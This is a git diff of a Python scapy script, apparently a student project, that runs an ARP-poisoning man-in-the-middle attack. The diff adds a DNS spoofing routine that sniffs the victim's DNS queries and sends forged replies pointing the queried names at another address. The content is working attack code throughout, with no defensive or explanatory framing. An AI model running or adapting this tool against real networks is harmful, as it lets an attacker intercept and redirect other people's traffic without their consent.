@@ -2,6 +2,7 @@
 # Authors: Matt Matero & Will Cusick
 # Python Version: 3.5.2
 from scapy.all import *
+import socket
 import atexit
 import sys
 import os
@@ -66,14 +67,34 @@ def trick(gate_mac, victim_mac):
   send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst=gate_mac))
 
 
+def blacklist(packet, spoofs):
+  print(packet['DNS Question Record'].qname)
+  for s in spoofs:
+    if s.lower() in packet['DNS Question Record'].qname:
+      print('testing')
+      return True
+  return False
+
+destIP = socket.gethostbyname('reddit.com')
 def dns_spoof(dns_pkt):
-  print(dns_pkt)
-  #spoofed_sites = ['businessinsider.com'] # only spoof small set of websites
+  spoofed_sites = ['businessinsider'.encode(), 'verisign'.encode(), 'reddit'.encode()] # only spoof small set of websites
+  ip = dns_pkt[IP]
+  dns = dns_pkt[DNS]
+  query = dns.qd
+  
+  #print(socket.gethostbyname(socket.gethostname()))
+  #print(destIP)
+
+  #if blacklist(dns_pkt, spoofed_sites):
+  spoof = Ether(dst=dns_pkt[Ether].src)/IP(src=ip.dst,dst=ip.src)/UDP(sport=ip.dport,dport=ip.sport)/\
+            DNS(id=dns.id, z=0, ra=1,qr=1,qdcount=1,ancount=1,an=DNSRR(rrname=query.qname,rdata=destIP,ttl=3600,type=1),qd=query)
+  sendp(spoof, verbose=0, iface=interface)
+  print('sent!')
 
 def sniffer(dns=False):
     if dns:
       pkt = sniff(iface=interface, filter='udp port 53',count=1)
-      return pkt
+      return pkt[0] # only a single packet
     else:
       pkts = sniff(iface=interface, count=100,
                  prn=lambda x: x.sprintf(" Source: %IP.src% : %Ether.src%, \n"
@@ -137,19 +158,15 @@ def mitm():
 
   print("[*] Poisoning Targets...")
   run = True
+  local_host = socket.gethostbyname(socket.gethostname())
   while run:
     try:
       trick(gate_mac, victim_mac)
-      #sniffer()
-      #pkt = sniffer(True) # grab single dns packet
-      #print('mitm pkt: ')
-      #print(pkt)
-      #if DNS in pkt[0] and pkt[0][IP].src:
-      #  print('Attempting DNS Spoof...')
-      #  dns_spoof(pkt)
-      time.sleep(1.5)
-      dns_pkt = sniffer(True)
-      dns_spoof(dns_pkt)
+
+      pkt = sniffer(True)
+
+      if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src == victim_ip:
+        dns_spoof(pkt)
     except KeyboardInterrupt:
       reARP(gate_mac, victim_mac)
       print("[*] User Requested Shutdown")
